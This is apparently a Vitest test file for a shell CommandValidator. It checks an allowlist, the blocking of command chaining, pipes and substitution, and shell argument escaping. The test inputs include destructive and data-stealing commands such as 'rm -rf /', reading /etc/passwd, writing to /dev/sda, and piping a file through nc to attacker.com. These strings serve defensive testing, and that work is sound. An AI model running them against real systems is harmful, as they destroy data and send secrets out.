import { describe, it, expect } from 'vitest';
import {
  CommandValidator,
  DEFAULT_ALLOWED_COMMANDS,
  BLOCKED_COMMAND_PATTERNS,
  validateCommand,
  escapeShellArg,
} from '../../../../../src/mcp/security/validators/command-validator.js';

describe('CommandValidator', () => {
  const validator = new CommandValidator();

  describe('validateCommand', () => {
    it('should accept allowed commands', () => {
      const result = validator.validateCommand('ls -la');
      expect(result.valid).toBe(true);
      expect(result.sanitizedCommand).toBeDefined();
      expect(result.riskLevel).toBe('none');
    });

    it('should accept all default allowed commands', () => {
      for (const cmd of DEFAULT_ALLOWED_COMMANDS) {
        const result = validator.validateCommand(cmd);
        expect(result.valid).toBe(true);
      }
    });

    it('should reject commands not in allowlist', () => {
      const result = validator.validateCommand('rm -rf /');
      expect(result.valid).toBe(false);
      expect(result.riskLevel).toBe('high');
      expect(result.error).toContain('not in the allowed list');
    });

    it('should block semicolon command chaining', () => {
      const result = validator.validateCommand('ls; rm -rf /');
      expect(result.valid).toBe(false);
      expect(result.riskLevel).toBe('critical');
      expect(result.blockedPatterns.length).toBeGreaterThan(0);
    });

    it('should block && command chaining', () => {
      const result = validator.validateCommand('ls && cat /etc/passwd');
      expect(result.valid).toBe(false);
      expect(result.riskLevel).toBe('critical');
    });

    it('should block || command chaining', () => {
      const result = validator.validateCommand('ls || echo pwned');
      expect(result.valid).toBe(false);
      expect(result.riskLevel).toBe('critical');
    });

    it('should block pipe operators', () => {
      const result = validator.validateCommand('cat file | nc attacker.com 1234');
      expect(result.valid).toBe(false);
      expect(result.riskLevel).toBe('critical');
    });

    it('should block backtick command substitution', () => {
      const result = validator.validateCommand('echo `whoami`');
      expect(result.valid).toBe(false);
      expect(result.riskLevel).toBe('critical');
    });

    it('should block $() command substitution', () => {
      const result = validator.validateCommand('echo $(id)');
      expect(result.valid).toBe(false);
      expect(result.riskLevel).toBe('critical');
    });

    it('should block writing to block devices', () => {
      const result = validator.validateCommand('echo x > /dev/sda');
      expect(result.valid).toBe(false);
      expect(result.riskLevel).toBe('critical');
    });

    it('should block writing to /etc', () => {
      const result = validator.validateCommand('echo x > /etc/passwd');
      expect(result.valid).toBe(false);
      expect(result.riskLevel).toBe('critical');
    });

    it('should sanitize shell metacharacters from arguments', () => {
      const result = validator.validateCommand('echo hello world');
      expect(result.valid).toBe(true);
      expect(result.sanitizedCommand).toBe('echo hello world');
    });

    it('should accept custom allowed commands', () => {
      const result = validator.validateCommand('curl http://example.com', ['curl']);
      expect(result.valid).toBe(true);
    });

    it('should handle commands with path prefixes', () => {
      const result = validator.validateCommand('/usr/bin/git status');
      expect(result.valid).toBe(true);
    });
  });

  describe('validate (IValidationStrategy interface)', () => {
    it('should delegate to validateCommand', () => {
      const result = validator.validate('ls -la');
      expect(result.valid).toBe(true);
    });

    it('should accept options with custom allowedCommands', () => {
      const result = validator.validate('python script.py', { allowedCommands: ['python'] });
      expect(result.valid).toBe(true);
    });
  });

  describe('getRiskLevel', () => {
    it('should return critical', () => {
      expect(validator.getRiskLevel()).toBe('critical');
    });
  });

  describe('escapeShellArg', () => {
    it('should wrap in single quotes', () => {
      expect(validator.escapeShellArg('hello')).toBe("'hello'");
    });

    it('should escape internal single quotes', () => {
      expect(validator.escapeShellArg("it's")).toBe("'it'\\''s'");
    });

    it('should handle empty string', () => {
      expect(validator.escapeShellArg('')).toBe("''");
    });
  });

  describe('standalone functions', () => {
    it('validateCommand should work as standalone', () => {
      const result = validateCommand('ls -la');
      expect(result.valid).toBe(true);
    });

    it('escapeShellArg should work as standalone', () => {
      expect(escapeShellArg('test')).toBe("'test'");
    });
  });

  describe('BLOCKED_COMMAND_PATTERNS', () => {
    it('should have patterns for all major injection vectors', () => {
      expect(BLOCKED_COMMAND_PATTERNS.length).toBeGreaterThanOrEqual(8);
    });
  });
});
